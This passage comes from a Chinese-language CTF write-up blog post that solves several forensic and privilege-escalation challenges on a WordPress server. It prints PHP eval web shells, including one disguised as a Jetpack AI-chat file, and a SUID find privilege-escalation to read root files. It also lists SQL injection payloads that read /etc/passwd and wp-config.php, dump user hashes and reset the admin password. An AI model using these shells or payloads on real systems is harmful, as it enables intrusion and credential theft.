+./wp-file-manager/lib/files/shell.php:<span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>
+./jetpack/extensions/blocks/ai-chat/ai-response.php:                @eval<span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>那就在 &#x2F;var&#x2F;www&#x2F;html&#x2F;wp-content&#x2F;plugins&#x2F;jetpack&#x2F;extensions&#x2F;blocks&#x2F;ai-chat&#x2F;ai-response.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+    <span class="token comment">// AI Chat Module Initialization</span>
+    <span class="token comment">/* ZmxhZ3tiNGNrZDAwcl9qZXRwYWNrX2FpX2NoYXRfMjAyNH0= */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ai_model'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ai_prompt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ai_prompt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ai_model'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'d41d8cd98f00b204e9800998ecf8427e'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>解码得到flag</p>
+<hr>
+<h1 id="提权挑战"><a href="#提权挑战" class="headerlink" title="提权挑战"></a>提权挑战</h1><p>提权</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/find
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+<span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/ls /root/ <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span>
+flag.txt
+<span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/cat /root/flag.txt <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span>
+flag<span class="token punctuation">&#123;</span>SUID_Command_Injection_Found_2024<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="misc-时光追溯"><a href="#misc-时光追溯" class="headerlink" title="misc-时光追溯"></a>misc-时光追溯</h1><p>从phpinfo可以知道apache日志路径，把日志dump下来</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/cat /var/log/apache2/access.log.bak <span class="token operator">></span> /tmp/1.txt <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span>
+<span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">'WPScan'</span> /tmp/1.txt <span class="token operator">></span> /tmp/6.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>最下面</p>
+<pre class="line-numbers language-log" data-language="log"><code class="language-log"><span class="token ip-address constant">140.187.54.232</span> <span class="token separator comment">- - </span><span class="token punctuation">[</span><span class="token date number">24/Jan/2025</span><span class="token operator">:</span><span class="token time number">15:17:37 +0000</span><span class="token punctuation">]</span> <span class="token string">"POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">1460</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"</span>
+<span class="token ip-address constant">115.123.255.233</span> <span class="token separator comment">- - </span><span class="token punctuation">[</span><span class="token date number">24/Jan/2025</span><span class="token operator">:</span><span class="token time number">15:17:54 +0000</span><span class="token punctuation">]</span> <span class="token string">"GET /wp-content/plugins/wp-file-manager/lib/files/decode.php HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">18926677</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0"</span>
+<span class="token ip-address constant">134.116.79.14</span> <span class="token separator comment">- - </span><span class="token punctuation">[</span><span class="token date number">24/Jan/2025</span><span class="token operator">:</span><span class="token time number">15:18:02 +0000</span><span class="token punctuation">]</span> <span class="token string">"GET /wp-content/plugins/wp-file-manager/lib/files/decode.php?test=123123123 HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">16979933</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>那么找最早访问 connector.minimal.php 的地方</p>
+<p><img src="/blog/2025/01/28/CTFplus2025%E6%96%B0%E6%98%A5%E6%8C%91%E6%88%98%E8%B5%9B/image-20250128220534719.png" alt="image-20250128220534719"></p>
+<p><code>24/Jan/2025:15:11:00-37.106.98.98-/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php</code></p>
+<p>flag：<code>flag&#123;c40bc119b7c30c0d48ac0e25749e3be0&#125;</code></p>
+<hr>
+<h1 id="misc-数据足迹"><a href="#misc-数据足迹" class="headerlink" title="misc-数据足迹"></a>misc-数据足迹</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> /var/log/mysql/slow-query.log.bak <span class="token operator">></span> /tmp/slow.txt <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span>
+<span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> /var/log/mysql/error.log.bak <span class="token operator">></span> /tmp/err.txt <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>dump下来后使用<code> sort slow.log | uniq -c</code>清洗数据</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sort</span> slow.log <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token parameter variable">-c</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"timestamp"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"wp_usermeta"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"Time"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"wp_postmeta"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"Query_time"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"wp_posts"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"comment_post_ID"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"ID"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">GRANT ALL PRIVILEGES ON wordpress.* TO &#39;hack&#39;@&#39;%&#39;;
+SELECT * FROM (,6,7,8,9,10) AS t;
+SELECT * FROM (1,2,3,4,) AS t;
+SELECT * FROM (4f527564) AS t;
+SELECT * FROM (4f597275) AS t;
+SELECT * FROM (596c4153) AS t;
+SELECT * FROM (5b77616c) AS t;
+SELECT * FROM (65717f57) AS t;
+SELECT * FROM (666 *&#x2F;) AS t;
+SELECT * FROM (6c6c6f62) AS t;
+SELECT * FROM (7373714d) AS t;
+SELECT * FROM (747e6f63) AS t;
+SELECT * FROM (7f6c637f) AS t;
+SELECT * FROM (LOAD_FILE(&#39;&#x2F;etc&#x2F;passwd&#39;)) AS t;
+SELECT * FROM (SELECT * FROM wp_users WHERE id&#x3D;1) AS t;
+SELECT * FROM (UNION SELECT) AS t;
+SELECT * FROM wp_links WHERE link_visible &#x3D; &#39;Y&#39;;
+SELECT * FROM wp_options WHERE autoload&#x3D;&#39;yes&#39;;
+SELECT * FROM wp_options WHERE option_name LIKE &#39;_site%&#39;;
+SELECT * FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id &#x3D; tt.term_id;
+SELECT * FROM wp_terms WHERE term_id IN (SELECT term_id FROM wp_term_taxonomy);
+SELECT * FROM wp_users WHERE user_login &#x3D; &#39;admin&#39; AND password &#x3D; &#39;&#39; OR &#39;1&#39;&#x3D;&#39;1&#39;;
+SELECT * FROM wp_users WHERE user_login &#x3D; &#39;admin&#39; OR &#39;1&#39;&#x3D;&#39;1&#39;;
+SELECT * FROM wp_users WHERE user_login &#x3D; &#39;admin&#39; UNION SELECT null,null,null,null,null,null,null,null,null,null;
+SELECT * FROM wp_users WHERE user_login LIKE 0x61646D696E;
+SELECT * INTO OUTFILE &#39;&#x2F;tmp&#x2F;dump.txt&#39; FROM wp_users;
+SELECT &#x2F;* d7275;
+SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name&#x3D;&#39;wp_users&#39;;
+SELECT CONCAT(0x7c,user_login,0x7c,user_pass,0x7c) FROM wp_users;
+SELECT CURRENT_USER();
+SELECT GROUP_CONCAT(table_name) FROM information_schema.tables;
+SELECT IF(SUBSTRING(user_pass,1,1)&#x3D;&#39;a&#39;,SLEEP(5),0) FROM wp_users WHERE user_login&#x3D;&#39;admin&#39;;
+SELECT LOAD_FILE(&#39;&#x2F;etc&#x2F;passwd&#39;);
+SELECT LOAD_FILE(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;wp-config.php&#39;);
+SELECT SCHEMA_NAME FROM information_schema.schemata;
+SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema&#x3D;&#39;wordpress&#39;;
+SELECT UNHEX(HEX(LOAD_FILE(&#39;&#x2F;etc&#x2F;passwd&#39;)));
+SELECT USER();
+SELECT VERSION();
+SELECT id, user_login, user_pass FROM wp_users &#x2F;*dump users*&#x2F;;
+SELECT option_name, option_value FROM wp_options WHERE option_name LIKE &#39;%key%&#39;;
+UPDATE wp_users SET user_pass &#x3D; MD5(&#39;hacked&#39;) WHERE user_login &#x3D; &#39;admin&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>观察这几个子查询t的部分</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">6c6c6f62
+747e6f63
+4f527564
+7373714d
+4f597275
+65717f57
+7f6c637f
+596c4153
+5b77616c
+666 *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因为flag的16进制是<code>666c6167</code>，可知是<strong>逆序加十六进制解码</strong></p>
+<p>解出来是<code>flag&#123;SQLi_slow_query_MAsster_Controll.</code></p>
+<p>猜测和<code>*/</code>有关，找<code>/*</code>那行</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT 1 &#x2F;* d7275;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>那么把这个 d7275 带进去解码，就是flag</p>
+<p>最终的flag：<code>flag&#123;SQLi_slow_query_MAsster_Controller&#125;</code></p>
+<hr>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
